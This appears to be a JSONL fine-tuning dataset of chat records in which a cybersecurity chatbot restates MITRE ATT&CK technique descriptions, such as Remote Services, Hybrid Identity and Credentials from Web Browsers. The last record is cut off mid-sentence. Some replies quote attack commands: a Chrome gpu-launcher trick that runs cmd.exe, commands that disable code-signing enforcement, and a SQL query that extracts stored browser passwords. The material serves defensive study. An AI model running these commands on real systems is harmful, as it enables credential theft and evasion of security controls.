{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Remote Services' and with the Id: T1021 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Remote Services' and with the Id: T1021 is described as follows: Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into a service that accepts remote connections, such as telnet, SSH, and VNC. The adversary may then perform actions as the logged-on user.In an enterprise environment, servers and workstations can be organized into domains. Domains provide centralized identity management, allowing users to login using one set of credentials across the entire network. If an adversary is able to obtain a set of valid domain credentials, they could login to many different machines using remote access protocols such as secure shell (SSH) or remote desktop protocol (RDP).(Citation: SSH Secure Shell)(Citation: TechNet Remote Desktop Services) They could also login to accessible SaaS or IaaS services, such as those that federate their identities to the domain. Legitimate applications (such as [Software Deployment Tools](https://attack.mitre.org/techniques/T1072) and other administrative programs) may utilize [Remote Services](https://attack.mitre.org/techniques/T1021) to access remote hosts. For example, Apple Remote Desktop (ARD) on macOS is native software used for remote management. ARD leverages a blend of protocols, including [VNC](https://attack.mitre.org/techniques/T1021/005) to send the screen and control buffers and [SSH](https://attack.mitre.org/techniques/T1021/004) for secure file transfer.(Citation: Remote Management MDM macOS)(Citation: Kickstart Apple Remote Desktop commands)(Citation: Apple Remote Desktop Admin Guide 3.3) Adversaries can abuse applications such as ARD to gain remote code execution and perform lateral movement. In versions of macOS prior to 10.14, an adversary can escalate an SSH session to an ARD session which enables an adversary to accept TCC (Transparency, Consent, and Control) prompts without user interaction and gain access to data.(Citation: FireEye 2019 Apple Remote Desktop)(Citation: Lockboxx ARD 2019)(Citation: Kickstart Apple Remote Desktop commands). The systems targeted by this attack pattern are: Linux, macOS, Windows, IaaS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Mail Protocols' and with the Id: T1071.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Mail Protocols' and with the Id: T1071.003 is described as follows: Adversaries may communicate using application layer protocols associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. Protocols such as SMTP/S, POP3/S, and IMAP that carry electronic mail may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the email messages themselves. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.(Citation: FireEye APT28) . The systems targeted by this attack pattern are: Linux, macOS, Windows, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Hybrid Identity' and with the Id: T1556.007 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Hybrid Identity' and with the Id: T1556.007 is described as follows: Adversaries may patch, modify, or otherwise backdoor cloud authentication processes that are tied to on-premises user identities in order to bypass typical authentication mechanisms, access credentials, and enable persistent access to accounts.  Many organizations maintain hybrid user and device identities that are shared between on-premises and cloud-based environments. These can be maintained in a number of ways. For example, Azure AD includes three options for synchronizing identities between Active Directory and Azure AD(Citation: Azure AD Hybrid Identity):* Password Hash Synchronization (PHS), in which a privileged on-premises account synchronizes user password hashes between Active Directory and Azure AD, allowing authentication to Azure AD to take place entirely in the cloud * Pass Through Authentication (PTA), in which Azure AD authentication attempts are forwarded to an on-premises PTA agent, which validates the credentials against Active Directory * Active Directory Federation Services (AD FS), in which a trust relationship is established between Active Directory and Azure AD AD FS can also be used with other SaaS and cloud platforms such as AWS and GCP, which will hand off the authentication process to AD FS and receive a token containing the hybrid users\u2019 identity and privileges. By modifying authentication processes tied to hybrid identities, an adversary may be able to establish persistent privileged access to cloud resources. For example, adversaries who compromise an on-premises server running a PTA agent may inject a malicious DLL into the `AzureADConnectAuthenticationAgentService` process that authorizes all attempts to authenticate to Azure AD, as well as records user credentials.(Citation: Azure AD Connect for Read Teamers)(Citation: AADInternals Azure AD On-Prem to Cloud) In environments using AD FS, an adversary may edit the `Microsoft.IdentityServer.Servicehost` configuration file to load a malicious DLL that generates authentication tokens for any user with any set of claims, thereby bypassing multi-factor authentication and defined AD FS policies.(Citation: MagicWeb)In some cases, adversaries may be able to modify the hybrid identity authentication process from the cloud. For example, adversaries who compromise a Global Administrator account in an Azure AD tenant may be able to register a new PTA agent via the web console, similarly allowing them to harvest credentials and log into the Azure AD environment as any user.(Citation: Mandiant Azure AD Backdoors). The systems targeted by this attack pattern are: Windows, Azure AD, SaaS, Google Workspace, Office 365, IaaS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Vulnerability Scanning' and with the Id: T1595.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Vulnerability Scanning' and with the Id: T1595.002 is described as follows: Adversaries may scan victims for vulnerabilities that can be used during targeting. Vulnerability scans typically check if the configuration of a target host/application (ex: software and version) potentially aligns with the target of a specific exploit the adversary may seek to use.These scans may also include more broad attempts to [Gather Victim Host Information](https://attack.mitre.org/techniques/T1592) that can be used to identify more commonly known, exploitable vulnerabilities. Vulnerability scans typically harvest running software and version numbers via server banners, listening ports, or other network artifacts.(Citation: OWASP Vuln Scanning) Information from these scans may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)).. The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Cloud API' and with the Id: T1059.009 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Cloud API' and with the Id: T1059.009 is described as follows: Adversaries may abuse cloud APIs to execute malicious commands. APIs available in cloud environments provide various functionalities and are a feature-rich method for programmatic access to nearly all aspects of a tenant. These APIs may be utilized through various methods such as command line interpreters (CLIs), in-browser Cloud Shells, [PowerShell](https://attack.mitre.org/techniques/T1059/001) modules like Azure for PowerShell(Citation: Microsoft - Azure PowerShell), or software developer kits (SDKs) available for languages such as [Python](https://attack.mitre.org/techniques/T1059/006).  Cloud API functionality may allow for administrative access across all major services in a tenant such as compute, storage, identity and access management (IAM), networking, and security policies.With proper permissions (often via use of credentials such as [Application Access Token](https://attack.mitre.org/techniques/T1550/001) and [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004)), adversaries may abuse cloud APIs to invoke various functions that execute malicious actions. For example, CLI and PowerShell functionality may be accessed through binaries installed on cloud-hosted or on-premises hosts or accessed through a browser-based cloud shell offered by many cloud platforms (such as AWS, Azure, and GCP). These cloud shells are often a packaged unified environment to use CLI and/or scripting modules hosted as a container in the cloud environment.  . The systems targeted by this attack pattern are: IaaS, Azure AD, Office 365, SaaS, Google Workspace ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Search Open Technical Databases' and with the Id: T1596 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Search Open Technical Databases' and with the Id: T1596 is described as follows: Adversaries may search freely available technical databases for information about victims that can be used during targeting. Information about victims may be available in online databases and repositories, such as registrations of domains/certificates as well as public collections of network data/artifacts gathered from traffic and/or scans.(Citation: WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS)(Citation: Medium SSL Cert)(Citation: SSLShopper Lookup)(Citation: DigitalShadows CDN)(Citation: Shodan)Adversaries may search in different open databases depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).. The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Electron Applications' and with the Id: T1218.015 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Electron Applications' and with the Id: T1218.015 is described as follows: Adversaries may abuse components of the Electron framework to execute malicious code. The Electron framework hosts many common applications such as Signal, Slack, and Microsoft Teams.(Citation: Electron 2) Originally developed by GitHub, Electron is a cross-platform desktop application development framework that employs web technologies like JavaScript, HTML, and CSS.(Citation: Electron 3) The Chromium engine is used to display web content and Node.js runs the backend code.(Citation: Electron 1)Due to the functional mechanics of Electron (such as allowing apps to run arbitrary commands), adversaries may also be able to perform malicious functions in the background potentially disguised as legitimate tools within the framework.(Citation: Electron 1) For example, the abuse of `teams.exe` and `chrome.exe` may allow adversaries to execute malicious commands as child processes of the legitimate application (e.g., `chrome.exe --disable-gpu-sandbox --gpu-launcher=\"C:\\Windows\\system32\\cmd.exe /c calc.exe`).(Citation: Electron 6-8)Adversaries may also execute malicious content by planting malicious [JavaScript](https://attack.mitre.org/techniques/T1059/007) within Electron applications.(Citation: Electron Security). The systems targeted by this attack pattern are: macOS, Windows, Linux ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Disable or Modify Linux Audit System' and with the Id: T1562.012 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Disable or Modify Linux Audit System' and with the Id: T1562.012 is described as follows: Adversaries may disable or modify the Linux audit system to hide malicious activity and avoid detection. Linux admins use the Linux Audit system to track security-relevant information on a system. The Linux Audit system operates at the kernel-level and maintains event logs on application and system activity such as process, network, file, and login events based on pre-configured rules.Often referred to as `auditd`, this is the name of the daemon used to write events to disk and is governed by the parameters set in the `audit.conf` configuration file. Two primary ways to configure the log generation rules are through the command line `auditctl` utility and the file `/etc/audit/audit.rules`,  containing a sequence of `auditctl` commands loaded at boot time.(Citation: Red Hat System Auditing)(Citation: IzyKnows auditd threat detection 2022)With root privileges, adversaries may be able to ensure their activity is not logged through disabling the Audit system service, editing the configuration/rule files, or by hooking the Audit system library functions. Using the command line, adversaries can disable the Audit system service through killing processes associated with `auditd` daemon or use `systemctl` to stop the Audit service. Adversaries can also hook Audit system functions to disable logging or modify the rules contained in the `/etc/audit/audit.rules` or `audit.conf` files to ignore malicious activity.(Citation: Trustwave Honeypot SkidMap 2023)(Citation: ESET Ebury Feb 2014). The systems targeted by this attack pattern are: Linux ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Rogue Domain Controller' and with the Id: T1207 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Rogue Domain Controller' and with the Id: T1207 is described as follows: Adversaries may register a rogue Domain Controller to enable manipulation of Active Directory data. DCShadow may be used to create a rogue Domain Controller (DC). DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a DC. (Citation: DCShadow Blog) Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys.Registering a rogue DC involves creating a new server and nTDSDSA objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the KRBTGT hash. (Citation: Adsecurity Mimikatz Guide)This technique may bypass system logging and security monitors such as security information and event management (SIEM) products (since actions taken on a rogue DC may not be reported to these sensors). (Citation: DCShadow Blog) The technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis. Adversaries may also utilize this technique to perform [SID-History Injection](https://attack.mitre.org/techniques/T1134/005) and/or manipulate AD objects (such as accounts, access control lists, schemas) to establish backdoors for Persistence. (Citation: DCShadow Blog). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Code Signing Policy Modification' and with the Id: T1553.006 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Code Signing Policy Modification' and with the Id: T1553.006 is described as follows: Adversaries may modify code signing policies to enable execution of unsigned or self-signed code. Code signing provides a level of authenticity on a program from a developer and a guarantee that the program has not been tampered with. Security controls can include enforcement mechanisms to ensure that only valid, signed code can be run on an operating system. Some of these security controls may be enabled by default, such as Driver Signature Enforcement (DSE) on Windows or System Integrity Protection (SIP) on macOS.(Citation: Microsoft DSE June 2017)(Citation: Apple Disable SIP) Other such controls may be disabled by default but are configurable through application controls, such as only allowing signed Dynamic-Link Libraries (DLLs) to execute on a system. Since it can be useful for developers to modify default signature enforcement policies during the development and testing of applications, disabling of these features may be possible with elevated permissions.(Citation: Microsoft Unsigned Driver Apr 2017)(Citation: Apple Disable SIP)Adversaries may modify code signing policies in a number of ways, including through use of command-line or GUI utilities, [Modify Registry](https://attack.mitre.org/techniques/T1112), rebooting the computer in a debug/recovery mode, or by altering the value of variables in kernel memory.(Citation: Microsoft TESTSIGNING Feb 2021)(Citation: Apple Disable SIP)(Citation: FireEye HIKIT Rootkit Part 2)(Citation: GitHub Turla Driver Loader) Examples of commands that can modify the code signing policy of a system include <code>bcdedit.exe -set TESTSIGNING ON</code> on Windows and <code>csrutil disable</code> on macOS.(Citation: Microsoft TESTSIGNING Feb 2021)(Citation: Apple Disable SIP) Depending on the implementation, successful modification of a signing policy may require reboot of the compromised system. Additionally, some implementations can introduce visible artifacts for the user (ex: a watermark in the corner of the screen stating the system is in Test Mode). Adversaries may attempt to remove such artifacts.(Citation: F-Secure BlackEnergy 2014)To gain access to kernel memory to modify variables related to signature checks, such as modifying <code>g_CiOptions</code> to disable Driver Signature Enforcement, adversaries may conduct [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) using a signed, but vulnerable driver.(Citation: Unit42 AcidBox June 2020)(Citation: GitHub Turla Driver Loader). The systems targeted by this attack pattern are: Windows, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Deploy Container' and with the Id: T1610 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Deploy Container' and with the Id: T1610 is described as follows: Adversaries may deploy a container into an environment to facilitate execution or evade defenses. In some cases, adversaries may deploy a new container to execute processes associated with a particular image or deployment, such as processes that execute or download malware. In others, an adversary may deploy a new container configured without network rules, user limitations, etc. to bypass existing defenses within the environment. In Kubernetes environments, an adversary may attempt to deploy a privileged or vulnerable container into a specific node in order to [Escape to Host](https://attack.mitre.org/techniques/T1611) and access other containers running on the node. (Citation: AppSecco Kubernetes Namespace Breakout 2020)Containers can be deployed by various means, such as via Docker's <code>create</code> and <code>start</code> APIs or via a web application such as the Kubernetes dashboard or Kubeflow. (Citation: Docker Containers API)(Citation: Kubernetes Dashboard)(Citation: Kubeflow Pipelines) In Kubernetes environments, containers may be deployed through workloads such as ReplicaSets or DaemonSets, which can allow containers to be deployed across multiple nodes.(Citation: Kubernetes Workload Management) Adversaries may deploy containers based on retrieved or built malicious images or from benign images that download and execute malicious payloads at runtime.(Citation: Aqua Build Images on Hosts). The systems targeted by this attack pattern are: Containers ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'File Deletion' and with the Id: T1107 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'File Deletion' and with the Id: T1107 is described as follows: Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.There are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples include native [cmd](https://attack.mitre.org/software/S0106) functions such as DEL, secure deletion tools such as Windows Sysinternals SDelete, or other third-party file deletion tools. (Citation: Trend Micro APT Attack Tools). The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Private Keys' and with the Id: T1145 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Private Keys' and with the Id: T1145 is described as follows: Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures. (Citation: Wikipedia Public Key Crypto)Adversaries may gather private keys from compromised systems for use in authenticating to [Remote Services](https://attack.mitre.org/techniques/T1021) like SSH or for use in decrypting other collected files such as email. Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. Adversaries may also look in common key directories, such as <code>~/.ssh</code> for SSH keys on * nix-based systems or <code>C:\\Users\\(username)\\.ssh\\</code> on Windows.Private keys should require a password or passphrase for operation, so an adversary may also use [Input Capture](https://attack.mitre.org/techniques/T1056) for keylogging or attempt to [Brute Force](https://attack.mitre.org/techniques/T1110) the passphrase off-line.Adversary tools have been discovered that search compromised systems for file extensions relating to cryptographic keys and certificates. (Citation: Kaspersky Careto) (Citation: Palo Alto Prince of Persia). The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Modify Registry' and with the Id: T1112 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Modify Registry' and with the Id: T1112 is described as follows: Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.Access to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility [Reg](https://attack.mitre.org/software/S0075) may be used for local or remote Registry modification. (Citation: Microsoft Reg) Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.Registry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via [Reg](https://attack.mitre.org/software/S0075) or other utilities using the Win32 API. (Citation: Microsoft Reghide NOV 2006) Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence. (Citation: TrendMicro POWELIKS AUG 2014) (Citation: SpectorOps Hiding Reg Jul 2017)The Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system. (Citation: Microsoft Remote) Often [Valid Accounts](https://attack.mitre.org/techniques/T1078) are required, along with access to the remote system's [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) for RPC communication.. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Launch Daemon' and with the Id: T1543.004 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Launch Daemon' and with the Id: T1543.004 is described as follows: Adversaries may create or modify Launch Daemons to execute malicious payloads as part of persistence. Launch Daemons are plist files used to interact with Launchd, the service management framework used by macOS. Launch Daemons require elevated privileges to install, are executed for every user on a system prior to login, and run in the background without the need for user interaction. During the macOS initialization startup, the launchd process loads the parameters for launch-on-demand system-level daemons from plist files found in <code>/System/Library/LaunchDaemons/</code> and <code>/Library/LaunchDaemons/</code>. Required Launch Daemons parameters include a <code>Label</code> to identify the task, <code>Program</code> to provide a path to the executable, and <code>RunAtLoad</code> to specify when the task is run. Launch Daemons are often used to provide access to shared resources, updates to software, or conduct automation tasks.(Citation: AppleDocs Launch Agent Daemons)(Citation: Methods of Mac Malware Persistence)(Citation: launchd Keywords for plists)Adversaries may install a Launch Daemon configured to execute at startup by using the <code>RunAtLoad</code> parameter set to <code>true</code> and the <code>Program</code> parameter set to the malicious executable path. The daemon name may be disguised by using a name from a related operating system or benign software (i.e. [Masquerading](https://attack.mitre.org/techniques/T1036)). When the Launch Daemon is executed, the program inherits administrative permissions.(Citation: WireLurker)(Citation: OSX Malware Detection)Additionally, system configuration changes (such as the installation of third party package managing software) may cause folders such as <code>usr/local/bin</code> to become globally writeable. So, it is possible for poor configurations to allow an adversary to modify executables referenced by current Launch Daemon's plist files.(Citation: LaunchDaemon Hijacking)(Citation: sentinelone macos persist Jun 2019). The systems targeted by this attack pattern are: macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Cloud Infrastructure Discovery' and with the Id: T1580 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Cloud Infrastructure Discovery' and with the Id: T1580 is described as follows: An adversary may attempt to discover infrastructure and resources that are available within an infrastructure-as-a-service (IaaS) environment. This includes compute service resources such as instances, virtual machines, and snapshots as well as resources of other services including the storage and database services.Cloud providers offer methods such as APIs and commands issued through CLIs to serve information about infrastructure. For example, AWS provides a <code>DescribeInstances</code> API within the Amazon EC2 API that can return information about one or more instances within an account, the <code>ListBuckets</code> API that returns a list of all buckets owned by the authenticated sender of the request, the <code>HeadBucket</code> API to determine a bucket\u2019s existence along with access permissions of the request sender, or the <code>GetPublicAccessBlock</code> API to retrieve access block configuration for a bucket.(Citation: Amazon Describe Instance)(Citation: Amazon Describe Instances API)(Citation: AWS Get Public Access Block)(Citation: AWS Head Bucket) Similarly, GCP's Cloud SDK CLI provides the <code>gcloud compute instances list</code> command to list all Google Compute Engine instances in a project (Citation: Google Compute Instances), and Azure's CLI command <code>az vm list</code> lists details of virtual machines.(Citation: Microsoft AZ CLI) In addition to API commands, adversaries can utilize open source tools to discover cloud storage infrastructure through [Wordlist Scanning](https://attack.mitre.org/techniques/T1595/003).(Citation: Malwarebytes OSINT Leaky Buckets - Hioureas)An adversary may enumerate resources using a compromised user's access keys to determine which are available to that user.(Citation: Expel IO Evil in AWS) The discovery of these available resources may help adversaries determine their next steps in the Cloud environment, such as establishing Persistence.(Citation: Mandiant M-Trends 2020)An adversary may also use this information to change the configuration to make the bucket publicly accessible, allowing data to be accessed without authentication. Adversaries have also may use infrastructure discovery APIs such as <code>DescribeDBInstances</code> to determine size, owner, permissions, and network ACLs of database resources. (Citation: AWS Describe DB Instances) Adversaries can use this information to determine the potential value of databases and discover the requirements to access them. Unlike in [Cloud Service Discovery](https://attack.mitre.org/techniques/T1526), this technique focuses on the discovery of components of the provided services rather than the services themselves.. The systems targeted by this attack pattern are: IaaS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Credentials from Web Browsers' and with the Id: T1555.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Credentials from Web Browsers' and with the Id: T1555.003 is described as follows: Adversaries may acquire credentials from web browsers by reading files specific to the target browser.(Citation: Talos Olympic Destroyer 2018) Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.For example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file, <code>AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data</code> and executing a SQL query: <code>SELECT action_url, username_value, password_value FROM logins;</code>. The plaintext password can then be obtained by passing the encrypted credentials to the Windows API function <code>CryptUnprotectData</code>, which uses the victim\u2019s cached logon credentials as the decryption key.(Citation: Microsoft CryptUnprotectData April 2018) Adversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc.(Citation: Proofpoint Vega Credential Stealer May 2018)(Citation: FireEye HawkEye Malware July 2017) Windows stores Internet Explorer and Microsoft Edge credentials in Credential Lockers managed by the [Windows Credential Manager](https://attack.mitre.org/techniques/T1555/004).Adversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials.(Citation: GitHub Mimikittenz July 2016)After acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and/or accounts in order to expand access. This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator).. The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Path Interception by Search Order Hijacking' and with the Id: T1574.008 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Path Interception by Search Order Hijacking' and with the Id: T1574.008 is described as follows: Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.Search order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001), the search order differs depending on the method that is used to execute the program. (Citation: Microsoft CreateProcess) (Citation: Windows NT Command Shell) (Citation: Microsoft WinExec) However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.For example, \"example.exe\" runs \"cmd.exe\" with the command-line argument <code>net user</code>. An adversary may place a program called \"net.exe\" within the same directory as example.exe, \"net.exe\" will be run instead of the Windows system utility net. In addition, if an adversary places a program called \"net.com\" in the same directory as \"net.exe\", then <code>cmd.exe /C net user</code> will execute \"net.com\" instead of \"net.exe\" due to the order of executable extensions defined under PATHEXT. (Citation: Microsoft Environment Property)Search order hijacking is also a common practice for hijacking DLL loads and is covered in [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001).. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Defacement' and with the Id: T1491 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Defacement' and with the Id: T1491 is described as follows: Adversaries may modify visual content available internally or externally to an enterprise network, thus affecting the integrity of the original content. Reasons for [Defacement](https://attack.mitre.org/techniques/T1491) include delivering messaging, intimidation, or claiming (possibly false) credit for an intrusion. Disturbing or offensive images may be used as a part of [Defacement](https://attack.mitre.org/techniques/T1491) in order to cause user discomfort, or to pressure compliance with accompanying messages. . The systems targeted by this attack pattern are: Windows, IaaS, Linux, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Unused/Unsupported Cloud Regions' and with the Id: T1535 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Unused/Unsupported Cloud Regions' and with the Id: T1535 is described as follows: Adversaries may create cloud instances in unused geographic service regions in order to evade detection. Access is usually obtained through compromising accounts used to manage cloud infrastructure.Cloud service providers often provide infrastructure throughout the world in order to improve performance, provide redundancy, and allow customers to meet compliance requirements. Oftentimes, a customer will only use a subset of the available regions and may not actively monitor other regions. If an adversary creates resources in an unused region, they may be able to operate undetected.A variation on this behavior takes advantage of differences in functionality across cloud regions. An adversary could utilize regions which do not support advanced detection services in order to avoid detection of their activity.An example of adversary use of unused AWS regions is to mine cryptocurrency through [Resource Hijacking](https://attack.mitre.org/techniques/T1496), which can cost organizations substantial amounts of money over time depending on the processing power used.(Citation: CloudSploit - Unused AWS Regions). The systems targeted by this attack pattern are: IaaS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'DHCP Spoofing' and with the Id: T1557.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'DHCP Spoofing' and with the Id: T1557.003 is described as follows: Adversaries may redirect network traffic to adversary-owned systems by spoofing Dynamic Host Configuration Protocol (DHCP) traffic and acting as a malicious DHCP server on the victim network. By achieving the adversary-in-the-middle (AiTM) position, adversaries may collect network communications, including passed credentials, especially those sent over insecure, unencrypted protocols. This may also enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).DHCP is based on a client-server model and has two functionalities: a protocol for providing network configuration settings from a DHCP server to a client and a mechanism for allocating network addresses to clients.(Citation: rfc2131) The typical server-client interaction is as follows: 1. The client broadcasts a `DISCOVER` message.2. The server responds with an `OFFER` message, which includes an available network address. 3. The client broadcasts a `REQUEST` message, which includes the network address offered. 4. The server acknowledges with an `ACK` message and the client receives the network configuration parameters.Adversaries may spoof as a rogue DHCP server on the victim network, from which legitimate hosts may receive malicious network configurations. For example, malware can act as a DHCP server and provide adversary-owned DNS servers to the victimized computers.(Citation: new_rogue_DHCP_serv_malware)(Citation: w32.tidserv.g) Through the malicious network configurations, an adversary may achieve the AiTM position, route client traffic through adversary-controlled systems, and collect information from the client network.DHCPv6 clients can receive network configuration information without being assigned an IP address by sending a <code>INFORMATION-REQUEST (code 11)</code> message to the <code>All_DHCP_Relay_Agents_and_Servers</code> multicast address.(Citation: rfc3315) Adversaries may use their rogue DHCP server to respond to this request message with malicious network configurations.Rather than establishing an AiTM position, adversaries may also abuse DHCP spoofing to perform a DHCP exhaustion attack (i.e, [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002)) by generating many broadcast DISCOVER messages to exhaust 